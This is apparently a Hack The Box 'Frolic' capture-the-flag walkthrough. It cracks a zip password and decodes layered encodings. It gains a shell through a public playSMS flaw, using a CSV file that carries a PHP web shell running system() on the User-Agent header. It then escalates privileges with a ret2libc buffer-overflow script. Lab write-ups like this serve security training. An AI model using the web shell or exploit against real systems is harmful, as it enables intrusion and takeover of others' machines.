title: HTB Frolic
content:

curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d > index.php.zip

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt index.php.zip

password: password

index.php

cat index.php


Use xxd to read that back to bytes, which happens to be not only ASCII, but base64 characters:

cat index.php | xxd -r -p
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==

There are some \r\n in there that will screw up base64. I’ll remove them, and decode:

cat index.php | xxd -r -p | tr -d '\r\n' | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<

www-data shell

Public vulnerbility in playsms
https://www.exploit-db.com/exploits/42044/

book.csv

Name,Mobile,Email,Group code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,

Priv escalation

Transfer the binary with nc

We can use gdb to observe the binary, and I find the vulnable function.
It will be overflowed if we input more the 0x30 characters when we attack the binary.

Locate the offset

Check what libversion in the machine. We can find the function basic offset.

# python2
import struct
offset = 52
elf_address = 0xb7e19000
system_addr = elf_address + 0x0003ada0
exit_addr = elf_address + 0x0002e9d0
str_bin_sh = elf_address + 0x15ba0b

# print('system_addr: ' + system_addr)
# print('exit_addr: ' + elf_address)
# print('str_bin_sh' + str_bin_sh)

payload = (offset)*'A' + struct.pack('I',system_addr) + struct.pack('I',exit_addr) + struct.pack('I',str_bin_sh)
print(payload)

we can redirect the output to the file.

upload the payload, and run the rop with $(cat payload)
